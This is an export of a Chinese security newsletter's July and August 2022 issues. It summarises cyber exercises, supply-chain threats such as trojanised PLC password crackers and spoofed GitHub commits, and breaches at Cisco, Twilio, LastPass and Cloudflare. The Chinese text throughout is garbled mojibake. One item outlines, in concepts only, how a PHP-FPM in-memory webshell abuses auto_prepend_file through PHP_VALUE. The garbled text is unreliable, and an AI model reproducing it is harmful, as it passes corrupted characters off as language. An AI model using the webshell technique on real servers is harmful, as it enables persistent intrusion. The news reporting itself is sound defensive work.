injection****çš„ç¼“è§£æªæ–½æœ‰ä¸€å®šçš„ç”¨å¤„ï¼Œä½†é€šè¿‡æ»¥ç”¨æµè§ˆå™¨ç‰¹æ€§ï¼Œå¯ä»¥ç»•è¿‡è¿™äº›ç¼“è§£æªæ–½ï¼Œå¹¶é€šè¿‡æ³¨å…¥è·å¾—è·¨åŸŸä¿¡æ¯â€”â€”å³ä½¿åœ¨ä½ çš„ CSP ä¸­ç¦ç”¨äº† JavaScriptã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> portswiggerçœŸçš„æ˜¯æŠŠwebå®‰å…¨ç©é€äº†ï¼Œä¸€ç›´å¯ä»¥ä»ä»–ä»¬è¿™é‡Œå­¦åˆ°å„ç§æ–°å§¿åŠ¿ã€æ–°æ€è·¯ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://portswigger.net/research/bypassing-csp-with-dangling-iframes\r\n\r\n## å­¦ä¹ èµ„æº\r\n## Google chronicleæä¾›çš„ä¸€äº›å­¦ä¹ èµ„æº\r\n\r\næ¢ç´¢ Chronicle èµ„æºï¼ŒåŒ…æ‹¬ç™½çš®ä¹¦ã€ç½‘ç»œç ”è®¨ä¼šã€æ¡ˆä¾‹ç ”ç©¶å’Œæ•°æ®è¡¨ã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> å€¼å¾—ä»”ç»†çœ‹çœ‹ï¼Œç«å“åˆ†æå¿…å¤‡è‰¯å™¨ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://chronicle.security/knowledge-base/\r\n"},{"fields":{"slug":"/å®‰å…¨é€šè®¯ Security.News/Security.News@202207/","title":"Security.News@202207"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202207\r\ntags:\r\n  - å®‰å…¨é€šè®¯ Security.News\r\n  - è¡Œä¸šåŠ¨æ€\r\n  - ä¾›åº”é“¾å®‰å…¨\r\n  - å‹å•†åŠ¨æ€\r\n  - å®‰å…¨æ¼”ä¹ \r\n  - Github\r\n  - Microsoft\r\n  - å®‰å…¨åŠ å›º\r\n---\r\n\r\n## è¡Œä¸šåŠ¨æ€\r\n### Cyber Europe 2022:æ¬§ç›Ÿå®Œæˆå¤§è§„æ¨¡ç½‘ç»œæˆ˜æ¼”ä¹ \r\n\r\næ¥è‡ªæ¬§æ´²å„åœ°çš„ç½‘ç»œå®‰å…¨ä¸“å®¶åˆšåˆšå®Œæˆäº†è¿„ä»Šä¸ºæ­¢è§„æ¨¡æœ€å¤§çš„å›½é™…ç½‘ç»œå±æœºæ¨¡æ‹Ÿä¹‹ä¸€;Cyber Europe 2022æœ‰æ¥è‡ªæ¬§ç›Ÿå’Œæ¬§æ´²è‡ªç”±è´¸æ˜“åŒº(EFTA)29ä¸ªå›½å®¶çš„800å¤šåç½‘ç»œå®‰å…¨ä¸“å®¶ä»¥åŠæ¬§ç›Ÿæœºæ„å’Œéƒ¨é—¨å‚åŠ ã€‚\r\n\r\n- ç¬¬ä¸€å¤©æ¼”ä¹ å†…å®¹åŒ…æ‹¬**ç¯¡æ”¹å®éªŒå®¤ç»“æœç­‰è™šå‡å®£ä¼ æ´»åŠ¨**ï¼Œä»¥åŠ**å¯¹æ¬§æ´²åŒ»é™¢ç½‘ç»œå‘åŠ¨æ”»å‡»**ã€‚\r\n- ç¬¬äºŒå¤©æ¼”ä¹ çš„å®‰å…¨äº‹ä»¶è¿›ä¸€æ­¥å‡çº§ä¸ºæ¬§ç›ŸèŒƒå›´å†…ã€‚æœ‰**æ”»å‡»è€…å¨èƒå°†å‘å¸ƒä¸ªäººåŒ»ç–—æ•°æ®**ï¼Œè€Œå¦ä¸€ä¸ªå›¢ä¼™åˆ™**åœ¨ç½‘ä¸Šæ•£å¸ƒæ¤å…¥å¼åŒ»ç–—è®¾å¤‡å­˜åœ¨æ¼æ´çš„è°£è¨€**ã€‚\r\n- æ­¤æ¬¡æ¼”ä¹ æµ‹è¯•äº†å„å‚ä¸æ–¹çš„äº‹ä»¶å“åº”èƒ½åŠ›ï¼Œä»¥åŠæ¬§ç›Ÿå„æœºæ„ä¸æ¬§æ´²è®¡ç®—æœºåº”æ€¥å“åº”å°ç»„ï¼ˆCERT-EUï¼‰ã€æ¬§ç›Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨å±€ï¼ˆENISAï¼‰åˆä½œæé«˜æ€åŠ¿æ„ŸçŸ¥èƒ½åŠ›çš„æˆæ•ˆã€‚æ­¤æ¬¡æ¼”ä¹ ä¸­å¸å–çš„ç»éªŒæ•™è®­ï¼Œå°†åœ¨ENISAå‘å¸ƒçš„äº‹åæŠ¥å‘Šä¸­æ­£å¼å…¬å¸ƒã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> å› ä¸ºç–«æƒ…åŸå› ï¼Œ2020å¹´çš„æ¼”ä¹ å»¶æœŸåˆ°2022å¹´æ‰è¿›è¡Œï¼Œè¿™ç§æ¶‰åŠ29ä¸ªå›½å®¶çš„ç½‘ç»œæˆ˜æ¼”ä¹ ç»„ç»‡éš¾åº¦ä¸€å®šå¾ˆå¤§ï¼Œå¯ä»¥æœŸå¾…ä¸‹2022å¹´çš„äº‹åæŠ¥å‘Šå…¬å¸ƒã€‚\r\n>\r\n> 2018å¹´çš„äº‹åæŠ¥å‘Šå¯ä»¥çœ‹[è¿™é‡Œ](https://www.enisa.europa.eu/publications/cyber-europe-2018-after-action-report/at_download/fullReport#:~:text=Cyber%20Europe%202018%20was%20the,and%20Information%20Security%20(ENISA).)ï¼Œæœ‰ç©ºçš„è¯æˆ‘ä¹Ÿä¼šè¿›è¡Œè§£è¯»ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://portswigger.net/daily-swig/cyber-europe-2022-eu-completes-large-scale-cyber-war-game-exercise\r\n- https://www.enisa.europa.eu/topics/cyber-exercises/cyber-europe-programme/cyber-europe-2022\r\n\r\n## ä¾›åº”é“¾å®‰å…¨\r\n### é’ˆå¯¹å·¥ä¸šç³»ç»Ÿçš„æ¶æ„å¯†ç ç ´è§£è½¯ä»¶\r\n\r\næ¶æ„æ”»å‡»è€…æ­£åœ¨ä½¿ç”¨å«æœ‰æœ¨é©¬ç¨‹åºçš„å¯ç¼–ç¨‹åºæ§åˆ¶å™¨å¯†ç ç ´è§£å·¥å…·æ¥æ„ŸæŸ“å·¥ä¸šç³»ç»Ÿã€‚æ¥è‡ª Dragos çš„ç ”ç©¶äººå‘˜åˆ†æäº†ä¸€ä¸ªæ¶æ„å¯†ç ç ´è§£å·¥å…·ï¼Œå…¶ä¸­åŒ…å«æ¶æ„è½¯ä»¶ Salityï¼Œå®ƒå°†è¢«æ„ŸæŸ“çš„ç³»ç»Ÿé›†ä¸­æˆåƒµå°¸ç½‘ç»œçš„ä¸€éƒ¨åˆ†ã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> ä»æœªç»å®¡æŸ¥çš„æ¥æºä¸‹è½½è½¯ä»¶å¹¶è¿è¡Œå¯èƒ½å¾ˆå±é™©ï¼Œè°çŸ¥é“æœ‰æ²¡æœ‰é¬¼åœ¨é‡Œé¢å‘¢ï¼Ÿæ¯”å¦‚ï¼šç½‘ä¸Šçš„å„ç§ç ´è§£è½¯ä»¶â€¦â€¦\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.dragos.com/blog/the-trojan-horse-malware-password-cracking-ecosystem-targeting-industrial-operators/\r\n\r\n### æ¬ºéª—çš„ GitHub æäº¤å…ƒæ•°æ®ä¸ºè½¯ä»¶ä¾›åº”é“¾æ”»å‡»åˆ›é€ äº†å¯èƒ½\r\n\r\næ¥è‡ª Checkmarx çš„ç ”ç©¶äººå‘˜è¡¨ç¤ºï¼Œä¼ªé€ çš„å…ƒæ•°æ®å¯èƒ½è¢«ç”¨æ¥æ¬ºéª—å¼€å‘äººå‘˜ä½¿ç”¨åŒ…å«æ¶æ„ä»£ç çš„å­˜å‚¨åº“ã€‚å¼€å‘äººå‘˜éœ€è¦å¯¹éªŒè¯ä¸æäº¤ç›¸å…³çš„èº«ä»½ä¿æŒè­¦æƒ•ã€‚\r\n\r\nGit ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€æ˜¯æäº¤ã€‚\r\n\r\næ­£å¦‚[è¿™é‡Œ](https://docs.github.com/en/pull-requests/committing-changes-to-your-project/creating-and-editing-commits/about-commits)æ‰€æŒ‡å‡ºçš„ï¼Œé™¤äº†æ•°æ®æœ¬èº«(å³å¯¹ä»£ç çš„æ›´æ”¹)ä¹‹å¤–ï¼Œæäº¤è¿˜åŒ…æ‹¬å…ƒæ•°æ®ã€‚è¿™ä¸ªå…ƒæ•°æ®ä»¥æ—¶é—´æˆ³å’Œåˆ›å»ºè€…èº«ä»½çš„å½¢å¼å‡ºç°ã€‚é—®é¢˜æ˜¯ä¸¤è€…éƒ½å¯ä»¥ä¼ªé€ ï¼š\r\n\r\n1. **ä¼ªé€ æäº¤æ—¶é—´**\r\n\r\n    **åˆ©ç”¨åœºæ™¯**\r\n\r\n    ç”±äºç¼ºä¹å¯¹æ—¶é—´æˆ³çš„éªŒè¯ï¼Œæ¶æ„ç”¨æˆ·å¯ä»¥é€šè¿‡ä½¿å…¶çœ‹èµ·æ¥å·²ç»éå¸¸æ´»è·ƒå¾ˆé•¿æ—¶é—´æ¥æ˜¾å¾—å¯ä¿¡ã€‚\r\n\r\n    GitHub ä¸Šç”¨æˆ·æ´»åŠ¨çš„ä¸€ä¸ªé‡è¦è¡¡é‡æ ‡å‡†æ˜¯åœ¨ç”¨æˆ·ä¸ªäººèµ„æ–™é¡µé¢ä¸Šæ˜¾ç¤ºçš„â€œæ´»åŠ¨å›¾â€ã€‚è¿™ä¸ªå›¾æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ˜¾ç¤ºç”¨æˆ·æ´»åŠ¨æ—¶é—´çš„çƒ­å›¾ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•æ—¶é—´æˆ³æ¥åˆ¶é€ æäº¤ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¼ªé€ çš„æ´»åŠ¨æ¥å¡«å……è¿™ä¸ªå›¾ã€‚\r\n\r\n2. **ä¼ªé€ è´¡çŒ®è€…**\r\n\r\n    **åˆ©ç”¨åœºæ™¯**\r\n\r\n    æ­£å¦‚å‡ å‘¨å‰ Aqua æ‰€æ˜¾ç¤ºçš„ï¼ŒNPM åŒ…ç®¡ç†å™¨å…è®¸åŒ…æ‰€æœ‰è€…åœ¨ä»–ä»¬çš„åŒ…ä¸­æ·»åŠ ä»»ä½•ä»–ä»¬æƒ³è¦çš„è´¡çŒ®è€…ï¼Œå¹¶é€šè¿‡è¿™æ ·åšæ¥æé«˜ä»–ä»¬çš„é¡¹ç›®å£°èª‰å’Œå¯ä¿¡åº¦ã€‚\r\n\r\n    é€šè¿‡æ¬ºéª—æäº¤è€…çš„èº«ä»½ï¼ŒGitHub å­˜å‚¨åº“ä¹Ÿå¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ã€‚ä¸ºäº†ä½¿ä»–ä»¬çš„é¡¹ç›®çœ‹èµ·æ¥å¯é ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è¿™ç§æŠ€æœ¯ä¸€æ¬¡æˆ–å¤šæ¬¡ï¼Œå¹¶ç”¨å·²çŸ¥çš„å¯é è´¡çŒ®è€…å¡«å……å­˜å‚¨åº“çš„è´¡çŒ®è€…éƒ¨åˆ†ï¼Œè¿™åè¿‡æ¥åˆä½¿é¡¹ç›®çœ‹èµ·æ¥å¯é ã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> GitHub æä¾›äº†ä¸€ä¸ªå®‰å…¨ç‰¹æ€§æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå…è®¸å¼€å‘äººå‘˜åœ¨æäº¤ä»£ç æ—¶éªŒè¯ä»–ä»¬çš„èº«ä»½ï¼Œä½†è¿™æ›´ä¾èµ–äºå¼€å‘äººå‘˜çš„å®‰å…¨æ„è¯†å’Œç§¯æå‚ä¸ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://checkmarx.com/blog/unverified-commits-are-you-unknowingly-trusting-attackers-code/\r\n\r\n## å‹å•†åŠ¨æ€\r\n### å¾®è½¯å…³é—­äº†ä¸¤ç§æ”»å‡»é€”å¾„: Office å®å’Œ RDP æš´åŠ›ç ´è§£\r\n\r\nè¿™å®¶ä¼ä¸š IT å·¨å¤´çš„æ”¿ç­–æ˜¯åœ¨ä¸‹è½½çš„ Office æ–‡æ¡£ä¸­é»˜è®¤å±è”½ Visual Basic for Applications (VBA)å®ï¼Œä½†åœ¨çŸ­æš‚åœé¡¿ä¹‹åï¼Œè¯¥æ”¿ç­–å†æ¬¡è¢«æ¿€æ´»ï¼Œä»¥å›åº”é‚£äº›åœ¨å®‰å…¨é˜²å¾¡æ–¹é¢é‡åˆ°å›°éš¾çš„ç”¨æˆ·çš„åé¦ˆã€‚\r\n\r\nåŒæ ·åœ¨æœ¬å‘¨ï¼Œå¾®è½¯åœ¨ Windows 11ä¸­å¯ç”¨äº†ä¸€ä¸ªé»˜è®¤è®¾ç½®ï¼Œè¯¥è®¾ç½®æ—¨åœ¨é˜»æ­¢æˆ–å‡ç¼“æ˜æ˜¾çš„è¿œç¨‹æ¡Œé¢åè®®(Remote Desktop Protocolï¼ŒRDP)æš´åŠ›ç ´è§£æ”»å‡»ï¼›åœ¨10æ¬¡ä¸æ­£ç¡®çš„ç™»å½•å°è¯•åï¼Œå¸æˆ·å°†è¢«é”å®š10åˆ†é’Ÿã€‚åœ¨ Windows10ä¸­å¯ä»¥ä½¿ç”¨å¸æˆ·é”å®šè®¾ç½®ï¼Œä½†é»˜è®¤æƒ…å†µä¸‹ä¸å¯ç”¨è¯¥è®¾ç½®ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.theregister.com/2022/07/22/microsoft-windows-vba-macros/\r\n\r\n"},{"fields":{"slug":"/å®‰å…¨é€šè®¯ Security.News/Security.News@202208/","title":"Security.News@202208"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202208\r\ntags:\r\n  - å®‰å…¨é€šè®¯ Security.News\r\n  - è¡Œä¸šåŠ¨æ€\r\n  - TTPsåŠ¨æ€\r\n  - å®‰å…¨äº‹ä»¶\r\n  - Twillo\r\n  - Cisco\r\n  - Lapsus$\r\n  - å‹’ç´¢è½¯ä»¶\r\n  - å¥‡å®‰ä¿¡\r\n  - Cloudflare\r\n  - é’“é±¼\r\n  - MFA\r\n  - éšç§\r\n---\r\n\r\n## è¡Œä¸šåŠ¨æ€\r\n### CNCERTå‘å¸ƒã€Š**å‹’ç´¢è½¯ä»¶é˜²èŒƒæŒ‡å—**ã€‹\r\n\r\næ„Ÿæ¦‚CNCERTç»ˆäºä¸åœŸäº†ï¼Œåšå‡ºæ¥è¿™ä¹ˆäº’è”ç½‘èŒƒå„¿çš„æŒ‡å—\r\n\r\n![å‹’ç´¢è½¯ä»¶é˜²èŒƒæŒ‡å—](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/o6MFMh.jpg)\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- http://www.cac.gov.cn/2021-08/30/c_1631913461840082.htm\r\n\r\n### æ–°å·¥å…·æ£€æŸ¥ç§»åŠ¨åº”ç”¨çš„æµè§ˆå™¨æ˜¯å¦å­˜åœ¨éšç§é£é™©ï¼ŒInstagram/facebookç­‰appä¸­æ‹›\r\n\r\n8æœˆ19æ—¥æŠ¥é“ï¼Œä¸€ä¸ªåä¸ºâ€œInAppBrowserâ€çš„æ–°åœ¨çº¿å·¥å…·å¯è®©æ‚¨åˆ†æåµŒå…¥åœ¨ç§»åŠ¨åº”ç”¨ç¨‹åºä¸­çš„åº”ç”¨å†…æµè§ˆå™¨çš„è¡Œä¸ºï¼Œå¹¶ç¡®å®šå®ƒä»¬æ˜¯å¦å°†å¨èƒéšç§çš„JavaScriptæ³¨å…¥æ‚¨è®¿é—®çš„ç½‘ç«™ã€‚\r\n\r\nè¯¥å·¥å…·ç”±å¼€å‘äººå‘˜Felix Krauseåˆ›å»ºï¼Œä»–åœ¨æœ¬æœˆæ—©äº›æ—¶å€™è­¦å‘Šè¿‡è¿™ç§æ½œåœ¨çš„é£é™©è¡Œä¸ºï¼Œå¹¶è§£é‡Šäº†åº”ç”¨å†…æµè§ˆå™¨é€šè¿‡åœ¨ç”¨æˆ·è®¿é—®çš„æ¯ä¸ªç½‘é¡µä¸Šæ³¨å…¥JavaScriptè·Ÿè¸ªå™¨æ¥è·Ÿè¸ªç”¨æˆ·åœ¨çº¿çœ‹åˆ°å’Œåšçš„ä»»ä½•äº‹æƒ…æ˜¯å¤šä¹ˆå®¹æ˜“ã€‚\r\n\r\n![ç›¸å…³twitter](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/8bHtpb.jpg)\r\n\r\nä»¥Instagramä¸ºä¾‹ï¼Œå¯ä»¥çœ‹åˆ°æ’å…¥çš„jsåšäº†å“ªäº›äº‹æƒ…ï¼š\r\n\r\n![aOe2oK](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/aOe2oK.jpg)\r\n\r\n## TTPsåŠ¨æ€\r\n### å¾®è½¯è§‚å¯Ÿåˆ°ç°åœ¨è¶Šæ¥è¶Šå¤šçš„threat actorï¼ˆå›½å®¶çº§ï¼‰å¼€å§‹ä½¿ç”¨Sliverï¼Œå¼ƒç”¨cs\r\n\r\nå¾®è½¯åˆ†äº†Sliverçš„ä¸€äº›åŸç†å’ŒåŠŸèƒ½æ¨¡ç‰ˆï¼Œä»¥åŠåº”å¯¹çš„æ£€æµ‹æ–¹æ¡ˆï¼›Sliverç¡®å®æ¯”CSæ›´åŠ çµæ´»å¥½ç”¨ï¼Œä¸¤è€…çš„å¯¹æ¯”å¯ä»¥å‚è€ƒä¸‹é¢çš„æ–‡ç« \r\n- https://voiptuts.com/sliver-emerges-as-cobalt-strike-different-for-malicious-c2/\r\n- https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/\r\n\r\n### åˆ©ç”¨ PHP-FPM åšå†…å­˜é©¬çš„æ–¹æ³•\r\n\r\nå±äºæ—§å£¶è£…æ—§é…’ï¼Œæœ€è¿‘çœ‹åˆ°å¾ˆå¤šäººåœ¨è®¨è®ºï¼Œå°±åœ¨è¿™é‡Œä¹Ÿåˆ—ä¸€ä¸‹\r\n\r\næ ¸å¿ƒåŸç†æ˜¯ï¼š\r\n\r\n1. php-fpmå¯é€šè¿‡æŸç§æ–¹å¼ï¼ˆç»‘å®šå¤–ç½‘ã€SSRFï¼‰ç›´æ¥è®¿é—®\r\n2. Web æœåŠ¡å™¨ä¸­é—´ä»¶ä¼šå°†ç”¨æˆ·è¯·æ±‚è®¾ç½®æˆç¯å¢ƒå˜é‡ï¼ˆFastcgiâ†’php-fpmï¼‰,å¼ºå¤§çš„ PHP ä¸­æœ‰ä¸¤ä¸ªæœ‰è¶£çš„é…ç½®é¡¹ï¼š\r\n    1. `auto_prepend_file`ï¼šå‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¹‹å‰ï¼Œå…ˆåŒ…å«Â `auto_prepend_file`Â ä¸­æŒ‡å®šçš„æ–‡ä»¶ã€‚\r\n    2. `auto_append_file`ï¼šå‘Šè¯‰PHPï¼Œåœ¨æ‰§è¡Œå®Œæˆç›®æ ‡æ–‡ä»¶åï¼Œå†åŒ…å«Â `auto_append_file`Â æŒ‡å‘çš„æ–‡ä»¶ã€‚\r\n3. åœ¨ä¸€æ¬¡ fastcgi è¯·æ±‚ä¸­ï¼Œä»»ä½•é€šè¿‡ PHP_VALUE/PHP_ADMIN_VALUE ä¿®æ”¹è¿‡çš„PHPé…ç½®å€¼ï¼Œåœ¨æ­¤ FPM è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œéƒ½æ˜¯ä¼šä¿ç•™ä¸‹æ¥çš„ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://mp.weixin.qq.com/s/VrtFWM3Iufk0xkK_MRCCKA\r\n- https://xz.aliyun.com/t/9544\r\n\r\n## å®‰å…¨äº‹ä»¶\r\n\r\n### Cisco è¢«Lapsus$å…¥ä¾µ\r\n\r\nCiscoåœ¨2022å¹´8æœˆ3æ—¥æ‰¿è®¤ï¼Œè¯¥å…¬å¸åœ¨2022å¹´5æœˆ24æ—¥é­åˆ°å…¥ä¾µï¼Œå¹¶ç”±æ€ç§‘å®‰å…¨äº‹ä»¶åº”æ€¥å“åº”å°ç»„ï¼ˆCSIRTï¼‰ä¸æ——ä¸‹èµ„å®‰å…¬å¸Cisco Talosæºæ‰‹è¡¥æ•‘ï¼Œèµ·å› æ˜¯ä¸€åå‘˜å·¥çš„ä¸ªäººGoogleå¸å·é­åˆ°éª‡å®¢å…¥ä¾µã€‚è™½ç„¶æ€ç§‘å¹¶æœªå‘ç°ç³»ç»Ÿè¢«éƒ¨ç½²å‹’ç´¢æœ¨é©¬ï¼Œä½†å‹’ç´¢è½¯ä½“é›†å›¢Yanluowangå®£ç§°å·²å–å¾—2.8GBçš„æ€ç§‘èµ„æ–™ã€‚\r\n\r\nç”¨æˆ·é€šè¿‡Google Chromeå¯ç”¨äº†å¯†ç åŒæ­¥ï¼Œå¹¶å°†å…¶Ciscoå‡­æ®å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­ï¼Œä½¿è¯¥ä¿¡æ¯èƒ½å¤ŸåŒæ­¥åˆ°å…¶Googleå¸æˆ·ã€‚åœ¨è·å–ç”¨æˆ·çš„å‡­æ®åï¼Œæ”»å‡»è€…è¯•å›¾ä½¿ç”¨å„ç§æŠ€æœ¯ç»•è¿‡å¤šå› ç´ èº«ä»½éªŒè¯ï¼ˆMFAï¼‰ï¼ŒåŒ…æ‹¬è¯­éŸ³ç½‘ç»œé’“é±¼ï¼ˆä¹Ÿç§°ä¸ºâ€œvishingâ€ï¼‰å’ŒMFAç–²åŠ³ï¼Œå³å‘ç›®æ ‡çš„ç§»åŠ¨è®¾å¤‡å‘é€å¤§é‡æ¨é€è¯·æ±‚çš„è¿‡ç¨‹ï¼Œç›´åˆ°ç”¨æˆ·æ„å¤–æˆ–åªæ˜¯è¯•å›¾ä½¿ä»–ä»¬æ­£åœ¨æ¥æ”¶çš„é‡å¤æ¨é€é€šçŸ¥é™éŸ³ã€‚ç½‘ç»œé’“é±¼æ˜¯ä¸€ç§è¶Šæ¥è¶Šå¸¸è§çš„ç¤¾äº¤å·¥ç¨‹æŠ€æœ¯ï¼Œæ”»å‡»è€…è¯•å›¾è¯±éª—å‘˜å·¥é€šè¿‡ç”µè¯æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€åå‘˜å·¥æŠ¥å‘Šè¯´ï¼Œä»–ä»¬åœ¨å‡ å¤©å†…æ¥åˆ°äº†å¤šä¸ªç”µè¯ï¼Œå…¶ä¸­å‘¼å«è€… - ä»–ä»¬ç”¨å„ç§å›½é™…å£éŸ³å’Œæ–¹è¨€çš„è‹±è¯­äº¤è°ˆ - æ®ç§°ä¸ç”¨æˆ·ä¿¡ä»»çš„æ”¯æŒç»„ç»‡ç›¸å…³è”ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://blog.talosintelligence.com/2022/08/recent-cyber-attack.html\r\n\r\n### Twilio é’“é±¼å…¥ä¾µäº‹ä»¶\r\n\r\näº‘ç«¯é€šè®¯å¹³å°Twilioåœ¨8æœˆ7æ—¥å¦æ‰¿é­åˆ°é»‘å®¢å…¥ä¾µï¼Œé»‘å®¢é€šè¿‡é’“é±¼çŸ­ä¿¡å–å¾—äº†Twilioå‘˜å·¥çš„ç™»é™†å‡­è¯ï¼Œå¹¶çªƒå–äº†å®¢æˆ·æ•°æ®ï¼Œè€Œé‡‡ç”¨TwilioæœåŠ¡è¿›è¡Œç”µè¯å·ç è®¤è¯çš„Signalåˆ™è¡¨ç¤ºï¼Œçº¦æœ‰1900åç”¨æˆ·å—åˆ°Twilioé»‘å®¢äº‹ä»¶çš„æ³¢åŠã€‚\r\n\r\n![ç½‘ä¼ çš„é’“é±¼çŸ­ä¿¡](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/6I57MD.jpg)\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://support.signal.org/hc/en-us/articles/4850133017242-Twilio-Incident-What-Signal-Users-Need-to-Know-\r\n\r\n### å¥‡å®‰ä¿¡è¢«é»‘å¸½SEO\r\n![nRdJRR](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/nRdJRR.jpg)\r\n\r\nå®˜ç½‘å·²ç»ç«é€ŸåŠ äº†ä¸€ä¸ªpidå‚æ•°æ¥ä»£æ›¿åŸæ¥å¯æ§çš„product_name\r\nhttps://www.qianxin.com/support/productDetails?pid=423&product_name=aaa\r\n\r\n### LastPasså…¥ä¾µäº‹ä»¶\r\n\r\næ® LastPass æ–¹é¢è¡¨ç¤ºï¼Œé»‘å®¢é€è¿‡ç›—å–ä¸€ä¸ªå¼€å‘è€…å¸æˆ·ï¼Œå–å¾—äº† LastPass å¼€å‘ç¯å¢ƒçš„éƒ¨åˆ†æƒé™ï¼Œæœ‰éƒ¨åˆ†æºä»£ç å’Œä¸€äº›ä¸“æœ‰æŠ€æœ¯èµ„æ–™å› æ­¤é­åˆ°æ³„æ¼ï¼Œä¸è¿‡å®¢æˆ·çš„èµ„æ–™åŒ…æ‹¬å¯†ç åˆ™æœªå—å½±å“ã€‚\r\n\r\nå¾ˆå€¼å¾—å­¦ä¹ çš„ä¸€ç‚¹å¦‚ä¸‹ï¼Œè®¾è®¡ä¹‹åˆåœ¨æ¶æ„ä¸Šå°±è€ƒè™‘äº†éšç§&å®‰å…¨\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> æˆ‘ä»¬ä»ä¸å­˜å‚¨æˆ–äº†è§£æ‚¨çš„ä¸»å¯†ç ã€‚æˆ‘ä»¬åˆ©ç”¨è¡Œä¸šæ ‡å‡†çš„é›¶çŸ¥è¯†æ¶æ„ï¼Œ ç¡®ä¿ LastPass æ°¸è¿œæ— æ³•çŸ¥é“æˆ–è®¿é—®æˆ‘ä»¬å®¢æˆ·çš„ä¸»å¯†ç .æ‚¨å¯ä»¥åœ¨æ­¤å¤„é˜…è¯»æœ‰å…³é›¶çŸ¥è¯†çš„æŠ€æœ¯å®ç°[çš„ä¿¡æ¯](https://www.lastpass.com/security/zero-knowledge-security)\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://blog.lastpass.com/2022/08/notice-of-recent-security-incident/\r\n\r\n### Cloudflareé­é‡æ‰¹é‡çŸ­ä¿¡é’“é±¼æ”»å‡»åŠä»–ä»¬çš„åº”å¯¹æ–¹æ¡ˆ\r\n\r\næ˜¨å¤©ï¼Œ2022å¹´8æœˆ8æ—¥ï¼ŒTwilioåˆ†äº«è¯´ï¼Œä»–ä»¬[å—åˆ°äº†æœ‰é’ˆå¯¹æ€§çš„ç½‘ç»œé’“é±¼æ”»å‡»çš„ç ´å](https://www.twilio.com/blog/august-2022-social-engineering-attack)ã€‚å¤§çº¦åœ¨Twirioå—åˆ°æ”»å‡»çš„åŒæ—¶ï¼ŒCloudflareçœ‹åˆ°ä¸€ä¸ªå…·æœ‰éå¸¸ç›¸ä¼¼ç‰¹å¾çš„æ”»å‡»ä¹Ÿé’ˆå¯¹Cloudflareçš„å‘˜å·¥ã€‚è™½ç„¶ä¸ªåˆ«å‘˜å·¥ç¡®å®å› ç½‘ç»œé’“é±¼æ¶ˆæ¯è€Œå •è½ï¼Œä½†æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡è‡ªå·±ä½¿ç”¨[Cloudflare Oneäº§å“](https://www.cloudflare.com/cloudflare-one/)ä»¥åŠå‘è®¿é—®æˆ‘ä»¬æ‰€æœ‰åº”ç”¨ç¨‹åºæ‰€éœ€çš„æ¯ä½å‘˜å·¥å‘æ”¾ç‰©ç†å®‰å…¨å¯†é’¥æ¥é˜»æ­¢æ”»å‡»ã€‚\r\n\r\nCloudflareä½¿ç”¨ç¡¬ä»¶å¯†é’¥ä½œä¸ºMFAï¼Œæ‰€ä»¥å³ä½¿æœ‰3äººè¢«é’“é±¼ä¹Ÿæ²¡å—å½±å“ï¼›Google 2018å¹´å°±ä½¿ç”¨è¿™ç§æ–¹æ¡ˆäº†\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://krebsonsecurity.com/2018/07/google-security-keys-neutralized-employee-phishing/\r\n- https://blog.cloudflare.com/2022-07-sms-phishing-attacks/\r\n"},{"fields":{"slug":"/å®‰å…¨é€šè®¯ Security.News/Security.News@202209/","title":"Security.News@202209"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202209\r\ntags:\r\n  - å®‰å…¨é€šè®¯ Security.News\r\n  - å®‰å…¨äº‹ä»¶\r\n  - è¡Œä¸šåŠ¨æ€\r\n  - TTPsåŠ¨æ€\r\n  - å‹å•†åŠ¨æ€\r\n  - Bug 